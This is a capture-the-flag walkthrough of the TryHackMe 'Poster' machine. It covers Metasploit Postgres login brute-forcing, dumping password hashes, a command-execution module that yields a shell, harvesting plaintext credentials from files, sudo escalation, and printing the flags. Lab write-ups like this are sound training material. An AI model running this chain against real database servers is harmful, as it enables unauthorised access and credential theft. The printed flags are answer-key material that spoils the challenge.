# Poster
Difficulty: Easy IP:10.10.135.61

Scanned the IP with rustscan. Found 22,80,5432 ports open.
The 5432 was a postgresql service.
On googling enumeration for this port, I found out there is a metasploit scanner for this port.
I used scanner/postgres/postgres_login to enumerate postgresql users and found a valid match.

```
postgres:password
```

Now I had the creds, I logged into postgresql service by
```
psql -h 10.10.135.61 -U postgres

Used the following:

\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles
```
But I didn't found anything there.
But on metasploit, there is a scanner named auxiliary/admin/postgres/postgres_sql, with which we can run SQL querries on server.

Set the SQL to select version() and run. Version of postgresql is 9.5.21
Then for dumping hashes of users, I used scanner/postgres/postgres_hashdump

```
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc
```
To view files from server: auxiliary/admin/postgres/postgres_readfile
To run arbitrary commands I used: exploit/multi/postgres/postgres_copy_from_program_cmd_exec.
Using this exploit, I got a shell as postgres user.
In the /home directory, I found 2 users: alison, dark.
In dark's directory, I found credentials.txt with creds of dark.

```
dark:qwerty1234#!hackme
```
SSH into machine as dark.
It took me very much time to search for a way to get alison access. But eventually, I found a config.php file in /var/www/html

```
<?php 
	
	$dbhost = "127.0.0.1";
	$dbuname = "alison";
	$dbpass = "p4ssw0rdS3cur3!#";
	$dbname = "mysudopassword";
?>
```

Now, I can get alison shell.
User.txt
```
THM{postgresql_fa1l_conf1gurat1on}
```

Now I ran sudo -l and found that alison can run commands as root.
Sudo sudo su and got the root.txt

```
THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
```
